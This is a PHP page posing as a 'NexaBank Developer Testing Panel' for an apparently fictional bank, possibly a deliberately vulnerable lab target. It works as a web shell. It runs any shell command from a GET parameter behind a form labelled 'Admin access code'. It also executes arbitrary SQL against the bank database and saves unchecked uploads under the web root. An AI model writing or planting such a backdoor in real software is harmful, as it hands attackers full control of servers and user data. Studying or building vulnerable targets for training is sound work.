<?php
require_once 'db_config.php';

echo '<!DOCTYPE html>
<html>
<head>
    <title>NexaBank Dev Tools</title>
    <link href="../css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
    <div class="container mt-5">
        <div class="card shadow">
            <div class="card-header bg-danger text-white">
                <h3>🚨 NexaBank Developer Testing Panel 🚨</h3>
            </div>
            <div class="card-body">';

if (isset($_FILES['evilfile'])) {
    $uploadDir = '/var/www/html/nexabank/uploads/';
    $uploadPath = $uploadDir . basename($_FILES['evilfile']['name']);
    
    if (move_uploaded_file($_FILES['evilfile']['tmp_name'], $uploadPath)) {
        echo "<div class='alert alert-success'>File uploaded to: <a href='/uploads/{$_FILES['evilfile']['name']}' target='_blank'>{$uploadPath}</a></div>";
    } else {
        echo "<div class='alert alert-danger'>File upload failed.</div>";
    }
    echo "<hr>";
}

if (isset($_GET['sql'])) {
    echo "<h4>SQL Query Results:</h4><pre>";
    $result = $db->query($_GET['sql']);
    if ($result) {
        while ($row = $result->fetch_assoc()) print_r($row);
    } else {
        echo "ERROR: " . $db->error;
    }
    echo "</pre><hr>";
}

if (isset($_GET['cmd'])) {
    echo "<h4>Command Output:</h4><pre>";
    echo shell_exec($_GET['cmd']);
    echo "</pre><hr>";
}

echo '
                <h4>Image File Uploads</h4>
                <form method="POST" enctype="multipart/form-data">
                    <div class="mb-3">
                        <input type="file" name="evilfile" class="form-control">
                    </div>
                    <button type="submit" class="btn btn-warning">Upload Img</button>
                </form>
                <hr>
                <h4>SQL Query tester (nexabank_db[do not expose!])</h4>
                <form method="GET">
                    <div class="mb-3">
                        <input type="text" name="sql" class="form-control" placeholder="SELECT * FROM users">
                    </div>
                    <button type="submit" class="btn btn-primary">Execute</button>
                </form>
                <hr>
                <h4>Admin access code</h4>
                <form method="GET">
                    <div class="mb-3">
                        <input type="text" name="cmd" class="form-control" placeholder="circa1969@2025">
                    </div>
                    <button type="submit" class="btn btn-primary">Submit</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>';
